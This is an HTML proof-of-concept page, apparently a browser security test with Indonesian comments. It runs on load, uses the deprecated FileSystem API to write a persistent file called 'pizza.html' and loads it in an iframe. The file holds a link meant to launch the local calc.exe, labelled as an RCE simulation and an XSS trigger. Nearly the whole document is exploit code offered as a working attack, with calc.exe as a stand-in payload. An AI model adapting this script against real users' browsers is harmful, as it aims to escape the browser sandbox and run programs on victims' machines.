<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Filesystem API Test with RCE Simulation</title>
    <script>
        function createFile() {
            // Ukuran storage yang diminta (1MB)
            let storageSize = 1024 * 1024;

            // Minta akses ke FileSystem API (gunakan PERSISTENT agar file tetap ada)
            window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
                console.log("Filesystem berhasil diakses:", fs);

                // Buat file "pizza.html"
                fs.root.getFile("pizza.html", { create: true, exclusive: false }, function(fileEntry) {
                    console.log("File berhasil dibuat:", fileEntry.toURL());

                    // Buat writer untuk menulis ke file
                    fileEntry.createWriter(function(fileWriter) {
                        // Simulasi RCE menggunakan href untuk ngerestart kalkulator
                        let blob = new Blob([`
                            <html>
                            <body>
                                <h1>Malicious File</h1>
                                <p>If you click below, it will trigger an action.</p>
                                <a href="javascript:void(0);" onclick="window.location='file://C:/Windows/System32/calc.exe';">Click to open Calculator</a>
                            </body>
                            </html>
                        `], { type: "text/html" });

                        fileWriter.onwriteend = function() {
                            console.log("File berhasil ditulis:", fileEntry.toURL());
                            // Load file yang sudah kita buat tadi ke dalam iframe untuk trigger XSS
                            let iframe = document.createElement("iframe");
                            iframe.src = fileEntry.toURL();
                            document.body.appendChild(iframe);
                        };

                        fileWriter.onerror = function(err) {
                            console.error("Gagal menulis file:", err);
                        };

                        fileWriter.write(blob);
                    });

                }, function(err) {
                    console.error("Gagal membuat file:", err);
                });

            }, function(err) {
                console.error("Gagal mengakses FileSystem API:", err);
            });
        }

        // Jalankan fungsi untuk membuat file
        createFile();
    </script>
</head>
<body>
    <h1>Filesystem API Test with RCE Simulation</h1>
    <p>This page is attempting to use the Filesystem API to create a file with malicious content.</p>
    <iframe src="https://policies.google.com/terms?hl=en"></iframe>
</body>
</html>
